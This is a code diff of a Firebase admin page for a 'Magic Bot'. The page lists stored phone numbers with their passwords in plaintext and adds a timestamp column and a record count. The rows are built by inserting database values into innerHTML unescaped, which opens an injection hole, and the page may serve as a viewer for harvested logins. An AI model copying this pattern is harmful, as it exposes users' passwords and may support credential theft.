@@ -7,38 +7,45 @@
 <title>Painel Admin - Magic Bot</title>
 
 <style>
-body {
-    font-family: Arial, sans-serif;
-    background: #f2f2f2;
-    padding: 20px;
+
+body{
+    font-family:Arial,sans-serif;
+    background:#f2f2f2;
+    padding:20px;
 }
 
-h1 {
-    text-align: center;
+h1{
+    text-align:center;
 }
 
-table {
-    width: 100%;
-    background: white;
-    border-collapse: collapse;
+h3{
+    text-align:center;
+    color:#333;
 }
 
-th, td {
-    border: 1px solid #ccc;
-    padding: 10px;
-    text-align: center;
+button{
+    padding:10px 20px;
+    cursor:pointer;
+    margin-bottom:15px;
 }
 
-th {
-    background: #222;
-    color: white;
+table{
+    width:100%;
+    background:white;
+    border-collapse:collapse;
 }
 
-button {
-    padding: 10px 20px;
-    margin-bottom: 15px;
-    cursor: pointer;
+th,td{
+    border:1px solid #ccc;
+    padding:10px;
+    text-align:center;
 }
+
+th{
+    background:#222;
+    color:white;
+}
+
 </style>
 
 </head>
@@ -47,18 +54,28 @@ button {
 
 <h1>📊 Painel Admin Magic Bot</h1>
 
+<h3>Total de Registros: <span id="total">0</span></h3>
+
 <button onclick="sair()">Sair</button>
 
 <table>
 
 <thead>
+
 <tr>
+
 <th>Número</th>
+
 <th>Senha</th>
+
+<th>Data e Hora</th>
+
 </tr>
+
 </thead>
 
 <tbody id="dados">
+
 </tbody>
 
 </table>
@@ -72,44 +89,45 @@ button {
 
 <script src="firebase.js"></script>
 
-
 <script>
 
-// Verificar se o administrador está autenticado
+// Verificar login
 
-firebase.auth().onAuthStateChanged((user) => {
+firebase.auth().onAuthStateChanged((user)=>{
 
-    if (!user) {
+    if(!user){
 
-        window.location.href = "login.html";
+        window.location.href="login.html";
 
     }
 
 });
 
+const tabela=document.getElementById("dados");
 
-// Buscar dados do banco
+const total=document.getElementById("total");
 
-const tabela = document.getElementById("dados");
+db.ref("usuarios").on("value",(snapshot)=>{
 
+    tabela.innerHTML="";
 
-db.ref("usuarios").on("value", (snapshot) => {
+    let contador=0;
 
-    tabela.innerHTML = "";
+    snapshot.forEach((item)=>{
 
+        contador++;
 
-    snapshot.forEach((item) => {
+        const dados=item.val();
 
-        const dados = item.val();
-
-
-        tabela.innerHTML += `
+        tabela.innerHTML +=`
 
         <tr>
 
-            <td>${dados.numero}</td>
+        <td>${dados.numero}</td>
 
-            <td>${dados.senha}</td>
+        <td>${dados.senha}</td>
+
+        <td>${dados.dataHora || "-"}</td>
 
         </tr>
 
@@ -117,26 +135,21 @@ db.ref("usuarios").on("value", (snapshot) => {
 
     });
 
+    total.innerHTML=contador;
 
 });
 
-
-// Botão sair
-
 function sair(){
 
-    firebase.auth().signOut()
-    .then(() => {
+    firebase.auth().signOut().then(()=>{
 
-        window.location.href = "login.html";
+        window.location.href="login.html";
 
     });
 
 }
 
-
 </script>
 
-
 </body>
-</html>
+    </html>
